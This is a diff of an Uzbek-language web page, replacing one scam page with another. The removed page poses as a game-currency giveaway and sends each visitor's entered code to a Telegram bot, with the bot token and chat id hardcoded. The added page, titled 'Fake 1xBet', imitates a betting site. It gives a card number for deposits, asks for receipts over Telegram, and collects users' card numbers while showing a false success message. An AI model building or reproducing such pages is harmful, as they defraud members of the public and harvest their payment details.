@@ -1,96 +1,114 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>DLS Kod</title>
+  <meta charset="UTF-8">
+  <title>Fake 1xBet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      margin: 0;
-      background-color: #000;
+      background: #0d0f15;
       color: white;
       font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background: #0e65c4;
+      padding: 15px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: bold;
     }
     .container {
-      max-width: 400px;
-      margin: 60px auto;
       padding: 20px;
       text-align: center;
     }
-    h1 {
+    .balance {
       font-size: 20px;
-      color: #00ffcc;
-      margin-bottom: 20px;
-    }
-    input[type="text"] {
-      width: 100%;
-      padding: 10px;
-      border-radius: 5px;
-      border: none;
-      font-size: 14px;
+      margin: 10px 0;
+      color: #00ff99;
     }
     button {
-      margin-top: 15px;
-      padding: 10px 20px;
-      font-size: 15px;
-      background-color: #00cc66;
+      background: #007bff;
       color: white;
       border: none;
-      border-radius: 5px;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 6px;
+      margin: 10px 5px;
       cursor: pointer;
     }
-    #message {
-      margin-top: 15px;
+    button:hover {
+      background: #0056b3;
+    }
+    .card-box, .withdraw-box {
+      background: #1c1e26;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 20px;
+      display: none;
+    }
+    .card-number {
+      font-size: 18px;
+      margin-top: 10px;
       font-weight: bold;
+    }
+    input {
+      padding: 10px;
+      width: 90%;
+      border: none;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+    .success {
+      color: #00ff99;
+      font-weight: bold;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
+
+  <div class="header">1xBet — Fake Casino</div>
+
   <div class="container">
-    <h1>DLS TANGA 🪙 OLMOZ 💎 OLISH UCHUN ODAM QUSHISH KODNI KIRITING</h1>
-    <input type="text" id="userCode" placeholder="Kod kiriting" />
-    <button onclick="submitCode()">Kod yuborish</button>
-    <div id="message"></div>
+    <div class="balance">💰 Balans: <strong>0 so'm</strong></div>
+
+    <button onclick="showCard()">💳 Pul kiriting</button>
+    <button onclick="showWithdraw()">💸 Pulni yechish</button>
+
+    <div class="card-box" id="cardBox">
+      <p>💳 To‘lov uchun karta:</p>
+      <div class="card-number">9860 3566 3090 1425</div>
+      <p>💬 Chekni <a href="https://t.me/xewop" target="_blank" style="color:#00ccff;">xewop.t.me</a> akauntiga tashlang</p>
+    </div>
+
+    <div class="withdraw-box" id="withdrawBox">
+      <p>💸 Pulni yechish uchun karta raqamingizni kiriting:</p>
+      <input type="text" placeholder="Karta raqami">
+      <br>
+      <button onclick="submitWithdraw()">So‘rov yuborish</button>
+      <div id="successMsg" class="success"></div>
+    </div>
   </div>
 
   <script>
-    function submitCode() {
-      const kod = document.getElementById("userCode").value.trim();
-      const msg = document.getElementById("message");
-      msg.textContent = "";
+    function showCard() {
+      document.getElementById('cardBox').style.display = 'block';
+      document.getElementById('withdrawBox').style.display = 'none';
+      document.getElementById('successMsg').innerText = '';
+    }
 
-      if (!kod) return;
+    function showWithdraw() {
+      document.getElementById('withdrawBox').style.display = 'block';
+      document.getElementById('cardBox').style.display = 'none';
+      document.getElementById('successMsg').innerText = '';
+    }
 
-      const vaqt = new Date().toLocaleString();
-      const text = `📥 Yangi kod:\n\n🔢 Kod: ${kod}\n🕒 Vaqt: ${vaqt}`;
-
-      fetch("https://api.telegram.org/bot8132831494:AAHLt-ociDZXqqn9sWCPWG49Jdp23VoOXDo/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "7045265173",
-          text: text
-        })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          msg.style.color = "lime";
-          msg.textContent = "✅ KOD YUBORILDI. KODINGIZ TO‘G‘RI BO‘LSA KOIN VA OLMOZ BERILADI!";
-        } else {
-          msg.style.color = "red";
-          msg.textContent = "Xatolik yuz berdi!";
-        }
-      })
-      .catch(() => {
-        msg.style.color = "red";
-        msg.textContent = "Internet bilan muammo bor!";
-      });
-
-      document.getElementById("userCode").value = "";
+    function submitWithdraw() {
+      document.getElementById('successMsg').innerText = "✅ So‘rov yuborildi! Operator siz bilan bog‘lanadi.";
     }
   </script>
+
 </body>
 </html>
